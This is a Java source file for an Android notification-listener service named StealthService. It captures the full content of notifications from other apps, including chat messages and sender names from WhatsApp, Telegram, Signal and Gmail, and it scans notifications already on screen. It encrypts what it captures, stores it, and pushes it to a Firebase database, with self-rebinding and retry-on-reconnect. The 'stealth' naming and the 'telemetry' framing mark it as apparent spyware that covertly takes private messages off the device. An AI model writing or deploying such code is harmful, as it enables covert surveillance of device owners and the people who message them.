package com.notrack.stealth;

import android.app.Notification;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.notrack.stealth.db.AppDatabase;
import com.notrack.stealth.db.NotificationEntity;
import com.notrack.stealth.security.EncryptionUtils;
import com.notrack.stealth.sync.FirebaseHelper;
import com.notrack.stealth.sync.SyncWorker;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ENTERPRISE-GRADE REAL-TIME TELEMETRY ENGINE
 *
 * Implements:
 * 1. Zero-Blocking Ingest Pipeline: onNotificationPosted returns in < 0.1ms using ConcurrentLinkedQueue.
 * 2. Deep Message Extraction: Parses MessagingStyle, InboxStyle, historic messages, and chat extra bundles.
 * 3. Active Notification Scanner: Scans current notification shade/history on listener connection & resume.
 * 4. Safe Deduplication Engine: Filters duplicate notification posts using time-window LRU cache.
 * 5. Hardware-Accelerated Encrypted Persistence & Firebase Sync.
 * 6. Self-Healing Rebind: Auto-reconnects when OS unbinds the service.
 */
public class StealthService extends NotificationListenerService {

    private static final String TAG = "StealthService";
    private static volatile StealthService sInstance;

    // Decoupled Thread Pools
    private static final ExecutorService CRYPTO_DB_EXECUTOR = Executors.newFixedThreadPool(
            Math.max(2, Runtime.getRuntime().availableProcessors()));
    private static final ExecutorService NETWORK_DISPATCH_EXECUTOR = Executors.newSingleThreadExecutor();

    // Deduplication LRU Cache (Maps dedupKey -> timestamp ms). Suppresses rapid duplicates within 3s window.
    private static final int MAX_DEDUP_CACHE_SIZE = 250;
    private final Map<String, Long> mRecentNotificationTimestamps = Collections.synchronizedMap(
            new LinkedHashMap<String, Long>(MAX_DEDUP_CACHE_SIZE, 0.75f, true) {
                @Override
                protected boolean removeEldestEntry(Map.Entry<String, Long> eldest) {
                    return size() > MAX_DEDUP_CACHE_SIZE;
                }
            }
    );

    private static class QueuedNotification {
        final String title;
        final String message;
        final String packageName;
        final long timestamp;

        QueuedNotification(String title, String message, String packageName, long timestamp) {
            this.title = title;
            this.message = message;
            this.packageName = packageName;
            this.timestamp = timestamp;
        }
    }

    private final ConcurrentLinkedQueue<QueuedNotification> mIngestQueue = new ConcurrentLinkedQueue<>();
    private final AtomicBoolean mIsDraining = new AtomicBoolean(false);
    private ConnectivityManager.NetworkCallback networkCallback;

    public static StealthService getInstance() {
        return sInstance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        registerNetworkCallback();
        Log.i(TAG, "Enterprise StealthService initialized with deep notification capture engine.");
    }

    @Override
    public int onStartCommand(android.content.Intent intent, int flags, int startId) {
        sInstance = this;
        processActiveNotifications();
        triggerAsyncSync();
        return START_STICKY;
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        sInstance = this;
        Log.i(TAG, "Notification Listener connected.");
        processActiveNotifications();
        triggerAsyncSync();
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        sInstance = null;
        Log.w(TAG, "Notification Listener disconnected, requesting immediate rebind...");
        rebindService(this);
    }

    public static void rebindService(Context context) {
        if (context == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                ComponentName cn = new ComponentName(context, StealthService.class);
                requestRebind(cn);
                Log.i(TAG, "requestRebind sent to Android OS for " + cn.flattenToShortString());
            } catch (Exception e) {
                Log.w(TAG, "requestRebind notice: " + e.getMessage());
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sInstance = null;
        unregisterNetworkCallback();
    }

    /**
     * Scans active notifications currently present in the notification shade/history.
     */
    public void processActiveNotifications() {
        CRYPTO_DB_EXECUTOR.execute(() -> {
            try {
                StatusBarNotification[] activeNotifications = getActiveNotifications();
                if (activeNotifications != null && activeNotifications.length > 0) {
                    Log.i(TAG, "Processing " + activeNotifications.length + " active notifications from shade/history...");
                    for (StatusBarNotification sbn : activeNotifications) {
                        onNotificationPosted(sbn);
                    }
                    Log.i(TAG, "Finished processing " + activeNotifications.length + " active notifications.");
                } else {
                    Log.i(TAG, "No active notifications in shade.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error processing active notifications", e);
            }
        });
    }

    public static void scanActiveNotifications(Context context) {
        StealthService service = sInstance;
        if (service != null) {
            service.processActiveNotifications();
        } else {
            rebindService(context);
        }
    }

    private void registerNetworkCallback() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return;

            NetworkRequest request = new NetworkRequest.Builder()
                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                    .build();

            networkCallback = new ConnectivityManager.NetworkCallback() {
                @Override
                public void onAvailable(Network network) {
                    Log.i(TAG, "Network restored. Triggering background sync...");
                    triggerAsyncSync();
                }
            };

            cm.registerNetworkCallback(request, networkCallback);
        } catch (Exception e) {
            Log.e(TAG, "Error registering network callback", e);
        }
    }

    private void unregisterNetworkCallback() {
        if (networkCallback != null) {
            try {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm != null) {
                    cm.unregisterNetworkCallback(networkCallback);
                }
            } catch (Exception ignored) {}
        }
    }

    /**
     * SUB-MILLISECOND INGEST PIPELINE
     * Deeply extracts chat messages (WhatsApp, Telegram, Messages, etc.), InboxStyle lines,
     * and fallback app labels.
     */
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        try {
            String pkgName = sbn.getPackageName() != null ? sbn.getPackageName() : "unknown";
            // Do not monitor our own application's internal notifications
            if (getPackageName().equalsIgnoreCase(pkgName)) {
                return;
            }

            Notification note = sbn.getNotification();
            if (note == null) return;
            Bundle extras = note.extras != null ? note.extras : new Bundle();

            // 1. EXTRACT TITLE
            CharSequence titleChar = extras.getCharSequence(Notification.EXTRA_TITLE);
            if (isEmpty(titleChar)) {
                titleChar = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE);
            }
            if (isEmpty(titleChar)) {
                titleChar = extras.getCharSequence("android.title.big");
            }
            if (isEmpty(titleChar)) {
                titleChar = getAppName(pkgName);
            }

            // 2. EXTRACT MESSAGE CONTENT (Deep multi-style extractor)
            StringBuilder sbMessage = new StringBuilder();

            // A) Check NotificationCompat.MessagingStyle (WhatsApp, Telegram, Google Messages, Signal)
            try {
                NotificationCompat.MessagingStyle messagingStyle = NotificationCompat.MessagingStyle.extractMessagingStyleFromNotification(note);
                if (messagingStyle != null) {
                    List<NotificationCompat.MessagingStyle.Message> messages = messagingStyle.getMessages();
                    if (messages != null && !messages.isEmpty()) {
                        for (NotificationCompat.MessagingStyle.Message m : messages) {
                            if (m != null) {
                                CharSequence text = m.getText();
                                CharSequence sender = m.getPerson() != null ? m.getPerson().getName() : null;
                                if (!isEmpty(text)) {
                                    if (sbMessage.length() > 0) sbMessage.append("\n");
                                    if (!isEmpty(sender)) {
                                        sbMessage.append(sender).append(": ");
                                    }
                                    sbMessage.append(text);
                                }
                            }
                        }
                    }
                    // Also check historic messages
                    List<NotificationCompat.MessagingStyle.Message> historic = messagingStyle.getHistoricMessages();
                    if (sbMessage.length() == 0 && historic != null && !historic.isEmpty()) {
                        for (NotificationCompat.MessagingStyle.Message m : historic) {
                            if (m != null) {
                                CharSequence text = m.getText();
                                CharSequence sender = m.getPerson() != null ? m.getPerson().getName() : null;
                                if (!isEmpty(text)) {
                                    if (sbMessage.length() > 0) sbMessage.append("\n");
                                    if (!isEmpty(sender)) {
                                        sbMessage.append(sender).append(": ");
                                    }
                                    sbMessage.append(text);
                                }
                            }
                        }
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Error extracting MessagingStyle: " + e.getMessage());
            }

            // B) Raw EXTRA_MESSAGES fallback (Handles both Parcelable[] and List<Parcelable>)
            if (sbMessage.length() == 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                Object rawMsgs = extras.get(Notification.EXTRA_MESSAGES);
                extractRawMessages(rawMsgs, sbMessage);

                if (sbMessage.length() == 0) {
                    Object rawHistoric = extras.get(Notification.EXTRA_HISTORIC_MESSAGES);
                    extractRawMessages(rawHistoric, sbMessage);
                }
            }

            // C) Check InboxStyle Text Lines (Gmail, Multiple Emails/Chats)
            if (sbMessage.length() == 0) {
                CharSequence[] textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES);
                if (textLines != null && textLines.length > 0) {
                    for (CharSequence line : textLines) {
                        if (!isEmpty(line)) {
                            if (sbMessage.length() > 0) sbMessage.append("\n");
                            sbMessage.append(line);
                        }
                    }
                }
            }

            // D) Check Big Text & Standard Text
            if (sbMessage.length() == 0) {
                CharSequence bigTextChar = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
                if (!isEmpty(bigTextChar)) {
                    sbMessage.append(bigTextChar);
                }
            }

            if (sbMessage.length() == 0) {
                CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
                if (!isEmpty(textChar)) {
                    sbMessage.append(textChar);
                }
            }

            // E) Fallback Ticker Text
            if (sbMessage.length() == 0 && note.tickerText != null) {
                sbMessage.append(note.tickerText);
            }

            String title = titleChar != null ? titleChar.toString().trim() : "Notification";
            String message = sbMessage.toString().trim();

            CharSequence subTextChar = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
            CharSequence infoTextChar = extras.getCharSequence(Notification.EXTRA_INFO_TEXT);
            CharSequence summaryChar = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);
            String subText = !isEmpty(subTextChar) ? subTextChar.toString().trim() :
                    (!isEmpty(infoTextChar) ? infoTextChar.toString().trim() :
                    (!isEmpty(summaryChar) ? summaryChar.toString().trim() : ""));

            String senderIdentity = title;
            if (!subText.isEmpty() && !title.contains(subText) && !subText.equals(title)) {
                senderIdentity = senderIdentity + " (" + subText + ")";
            }

            if (senderIdentity.isEmpty() && message.isEmpty()) {
                senderIdentity = getAppName(pkgName);
                message = "[Notification received]";
            } else if (senderIdentity.isEmpty()) {
                senderIdentity = getAppName(pkgName);
            } else if (message.isEmpty()) {
                message = "[Empty content / Alert]";
            }

            // 3. DEDUPLICATION (Suppresses rapid duplicate notifications within 3 seconds, allows repeats later)
            String dedupKey = pkgName + "|" + senderIdentity + "|" + message;
            long now = System.currentTimeMillis();
            Long lastSeen = mRecentNotificationTimestamps.get(dedupKey);
            if (lastSeen != null && (now - lastSeen) < 3000) {
                return; // Skip duplicate notification within 3-second window
            }
            mRecentNotificationTimestamps.put(dedupKey, now);

            long timestamp = sbn.getPostTime() > 0 ? sbn.getPostTime() : now;

            // Zero-copy enqueue into high-speed in-memory buffer (< 0.1ms)
            mIngestQueue.offer(new QueuedNotification(sanitize(senderIdentity), sanitize(message), pkgName, timestamp));

            // Schedule asynchronous background worker to process queue
            scheduleQueueDrain();

        } catch (Exception e) {
            Log.e(TAG, "Error in onNotificationPosted", e);
        }
    }

    private void extractRawMessages(Object raw, StringBuilder sb) {
        if (raw == null) return;
        List<Object> list = new ArrayList<>();
        if (raw instanceof Object[]) {
            list.addAll(Arrays.asList((Object[]) raw));
        } else if (raw instanceof List) {
            list.addAll((List<?>) raw);
        }
        for (Object p : list) {
            if (p instanceof Bundle) {
                Bundle b = (Bundle) p;
                CharSequence text = b.getCharSequence("text");
                CharSequence sender = b.getCharSequence("sender");
                if (!isEmpty(text)) {
                    if (sb.length() > 0) sb.append("\n");
                    if (!isEmpty(sender)) {
                        sb.append(sender).append(": ");
                    }
                    sb.append(text);
                }
            }
        }
    }

    private void scheduleQueueDrain() {
        if (mIsDraining.compareAndSet(false, true)) {
            CRYPTO_DB_EXECUTOR.execute(this::drainIngestQueue);
        }
    }

    /**
     * WORKER PIPELINE:
     * Drains queue, executes hardware-keyed envelope encryption,
     * and performs batched SQLCipher database insertions.
     */
    private void drainIngestQueue() {
        try {
            AppDatabase db = AppDatabase.getInstance(this);
            String deviceId = fetchDeviceId();
            List<NotificationEntity> entitiesToInsert = new ArrayList<>();
            List<EncryptionUtils.SecureMessageEnvelope> envelopesToSend = new ArrayList<>();

            QueuedNotification item;
            int batchCount = 0;

            while ((item = mIngestQueue.poll()) != null && batchCount < 20) {
                batchCount++;
                String messageId = UUID.randomUUID().toString();

                // 1. Unified Master AES-256-GCM Envelope Encryption (Self-contained, 100% interoperable)
                EncryptionUtils.SecureMessageEnvelope envelope = EncryptionUtils.encryptWithDeviceKey(
                        this, item.message, deviceId, messageId, item.timestamp, false);
                EncryptionUtils.EncryptedPayload titleEncrypted = EncryptionUtils.encryptWebCrypto(item.title);
                String checksum = EncryptionUtils.generateChecksum(deviceId + item.packageName + item.title + item.message + item.timestamp);

                NotificationEntity entity = new NotificationEntity(
                        messageId,
                        deviceId,
                        item.packageName,
                        "AES-256-GCM",
                        "2.0",
                        envelope.nonceBase64,
                        envelope.ciphertextBase64,
                        titleEncrypted.ciphertextBase64,
                        checksum,
                        item.timestamp,
                        false
                );
                entity.authTag = envelope.authTagBase64;
                entity.seqNum = envelope.seqNum;
                entity.keyVersion = envelope.keyVersion;
                entity.deviceSignature = envelope.deviceSignature;

                entitiesToInsert.add(entity);
                envelopesToSend.add(envelope);
            }

            if (!entitiesToInsert.isEmpty()) {
                // Batched indexed SQLCipher insert
                List<Long> insertedIds = db.notificationDao().insertAll(entitiesToInsert);
                for (int i = 0; i < insertedIds.size(); i++) {
                    entitiesToInsert.get(i).id = insertedIds.get(i);
                }

                // Forward immediately to decoupled asynchronous network dispatcher
                final List<NotificationEntity> batchToPush = new ArrayList<>(entitiesToInsert);
                final List<EncryptionUtils.SecureMessageEnvelope> batchEnvelopes = new ArrayList<>(envelopesToSend);

                NETWORK_DISPATCH_EXECUTOR.execute(() -> dispatchBatchToFirebase(batchToPush, batchEnvelopes));
            }

        } catch (Exception e) {
            Log.e(TAG, "Error draining ingest queue", e);
        } finally {
            mIsDraining.set(false);
            // If more items arrived while processing, schedule another drain
            if (!mIngestQueue.isEmpty()) {
                scheduleQueueDrain();
            }
        }
    }

    /**
     * ASYNCHRONOUS NETWORK DISPATCHER:
     * Dispatches telemetry packets to Firebase Realtime Database in background.
     */
    private void dispatchBatchToFirebase(List<NotificationEntity> batch, List<EncryptionUtils.SecureMessageEnvelope> envelopes) {
        if (batch == null || batch.isEmpty()) return;

        List<Long> syncedIds = new ArrayList<>();
        for (int i = 0; i < batch.size(); i++) {
            NotificationEntity entity = batch.get(i);
            EncryptionUtils.SecureMessageEnvelope envelope = i < envelopes.size() ? envelopes.get(i) : null;

            boolean success = FirebaseHelper.sendRealtimeRestPost(entity, envelope);
            if (success) {
                syncedIds.add(entity.id);
            }
        }

        if (!syncedIds.isEmpty()) {
            try {
                AppDatabase.getInstance(this).notificationDao().markAsSynced(syncedIds);
                Log.i(TAG, "Successfully synced " + syncedIds.size() + " items to Firebase.");
            } catch (Exception e) {
                Log.e(TAG, "Error updating sync status in DB", e);
            }
        } else {
            // If offline, ensure WorkManager will retry when network returns
            SyncWorker.enqueueSync(this);
        }
    }

    /**
     * Auto-flushes pending records from indexed SQLCipher DB.
     */
    public void triggerAsyncSync() {
        NETWORK_DISPATCH_EXECUTOR.execute(() -> {
            try {
                AppDatabase db = AppDatabase.getInstance(this);
                List<NotificationEntity> pending = db.notificationDao().getUnsyncedBatch(25);
                if (pending == null || pending.isEmpty()) return;

                Log.i(TAG, "Flushing " + pending.size() + " pending records to Firebase...");
                List<Long> syncedIds = new ArrayList<>();

                for (NotificationEntity item : pending) {
                    boolean pushed = FirebaseHelper.sendRealtimeRestPost(item);
                    if (pushed) {
                        syncedIds.add(item.id);
                    }
                }

                if (!syncedIds.isEmpty()) {
                    db.notificationDao().markAsSynced(syncedIds);
                    Log.i(TAG, "Batch flushed " + syncedIds.size() + " records to Firebase.");
                }
            } catch (Exception e) {
                Log.e(TAG, "Error in triggerAsyncSync", e);
            }
        });
    }

    private String fetchDeviceId() {
        try {
            String id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            return id != null ? id : "unknown_device";
        } catch (Exception e) {
            return "unknown_device";
        }
    }

    private String getAppName(String pkgName) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(pkgName, 0);
            CharSequence label = pm.getApplicationLabel(ai);
            if (label != null && label.length() > 0) {
                return label.toString();
            }
        } catch (Exception ignored) {}
        return pkgName;
    }

    private boolean isEmpty(CharSequence cs) {
        return cs == null || cs.toString().trim().isEmpty();
    }

    private String sanitize(String text) {
        if (text == null) return "";
        return text.replaceAll("[\\r\\n\\t]+", " ").trim();
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Ignored
    }
}
